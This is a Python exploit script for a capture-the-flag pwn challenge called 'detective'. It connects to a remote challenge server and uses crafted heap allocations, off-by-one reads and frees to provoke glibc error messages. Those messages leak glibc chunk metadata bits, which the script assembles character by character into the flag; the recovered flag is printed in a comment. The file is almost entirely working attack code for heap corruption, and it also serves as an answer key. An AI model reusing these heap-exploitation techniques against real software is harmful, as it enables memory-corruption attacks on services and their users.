#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './detective'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False, 'gdbscript':''}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'35.221.81.216', 'port':30001})
env.select()

#==========

def attack(**kwargs):
    fmt = 'size: 0x{:x},  prev_inuse: {:>5},  is_mmapped: {:>5},  non_main_arena: {:>5}'
    flag = 'TSGCTF{'

    with log.progress('Detecting ') as p:
        for idx in range(7, 39):
            q = log.progress('[{:02}/38]'.format(idx))

            size = detect_size(idx)
            cand = size
            q.status(fmt.format(size, '-'*5, '-'*5, '-'*5))

            prev_inuse = test_prev_inuse(idx)
            q.status(fmt.format(size, str(prev_inuse), '-'*5, '-'*5))
            if prev_inuse:
                cand |= 0x1

            is_mmapped, non_main_arena = test_mmapped_arena(idx)
            q.status(fmt.format(size, str(prev_inuse), str(is_mmapped), '-'*5))
            if is_mmapped:
                cand |= 0x2

            if non_main_arena is None:
                non_main_arena = test_arena(idx, cand)
            q.status(fmt.format(size, str(prev_inuse), str(is_mmapped), str(non_main_arena)))
            if non_main_arena:
                cand |= 0x4

            q.success((fmt+'  =>  {:c}').format(size, str(prev_inuse), str(is_mmapped), str(non_main_arena), cand))
            flag += chr(cand)
            p.status('{}'.format(flag))
    flag += '}'

    print('FLAG : {}'.format(flag))
    # TSGCTF{67f7d58ac9301f273d16aec9829847b0}

def detect_size(idx):
    det = Detective(idx)

    for _ in range(7):
        det.alloc(0, 0x28, 'X')
        det.dealloc(0)

    det.alloc(0, 0x18, '0')
    det.alloc(1, 0x28, '1')
    det.dealloc(1)
    det.read(0, 0x18)

    det.alloc(1, 0x28)
    try:
        ret = det.recvuntil('\n', timeout=0.2)
    except:
        ret = b''
    finally:
        del(det)
    size =  0x60 if b'memory corruption (fast)' in ret else 0x30

    if size == 0x30:
        det = Detective(idx)

        det.alloc(0, 0x18, '0')
        det.alloc(1, 0x18, '1')
        det.read(0, 0x18)
        det.dealloc(1)
        try:
            ret = det.recvuntil('\n', timeout=0.2)
            if b'invalid size' in ret:
                size |= 0x8
        except:
            pass
        finally:
            del(det)

    return size

def test_prev_inuse(idx):
    det = Detective(idx)

    for _ in range(7):
        det.alloc(0, 0x88, 'X')
        det.dealloc(0)

    det.alloc(0, 0x88, '0')
    det.alloc(1, 0x18, '1')
    det.read(0, 0x88)
    det.dealloc(0)

    ret = det.recvuntil('\n')
    del(det)

    return b'double free' not in ret

def test_mmapped_arena(idx):
    det = Detective(idx)

    det.alloc(0, 0x18, '0')
    det.alloc(1, 0x18, '1')
    det.read(0, 0x18)
    det.dealloc(1)

    try:
        ret = det.recvuntil('\n')
    except:
        ret = b'Segmentation fault'
    finally:
        del(det)

    is_mmapped = b'invalid pointer' in ret
    non_main_arena = b'Segmentation fault' in ret
    return is_mmapped, None if is_mmapped else non_main_arena 

def test_arena(idx, cand):
    det = Detective(idx)

    for _ in range(7):
        det.alloc(0, 0x18, 'X')
        det.dealloc(0)
        det.alloc(0, 0x68, 'Y')
        det.dealloc(0)

    det.alloc(0, 0x18, 'a')
    det.dealloc(0)

    det.alloc(0, 0x68, '0')
    det.alloc(1, 0x68, b'\x00'*(cand-0x18) + p64(0x71))
    det.dealloc(1)
    det.dealloc(0)

    det.alloc(0, 0x18, 'b')
    det.read(0, 0x20)

    det.alloc(0, 0x68, 'Z')
    det.alloc(0, 0x68)
 
    ret = det.recvuntil('\n', timeout=0.2)
    del(det)

    return b'memory corruption (fast)' in ret

class Detective:
    def __init__(self, idx):
        self.comn = Communicate(env.mode, **env.target)
        self.comn.quiet = True
        self.comn.connect()
        conn = self.comn.connection

        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter
        self.interactive    = conn.interactive

        self.sendlineafter('index > ', str(idx))

    def __del__(self):
        del(self.comn)

    def alloc(self, idx, size, data = None):
        self.sendlineafter('> ', '0')
        self.sendlineafter('index > ', str(idx))
        self.sendlineafter('size > ', str(size))
        if data is not None:
            self.sendlineafter('data > ', data)

    def dealloc(self, idx):
        self.sendlineafter('> ', '1')
        self.sendlineafter('index > ', str(idx))

    def read(self, idx, at):
        self.sendlineafter('> ', '2')
        self.sendlineafter('index > ', str(idx))
        self.sendlineafter('at > ', str(at))

#==========

def main():
    attack()

if __name__=='__main__':
    main()

#==========
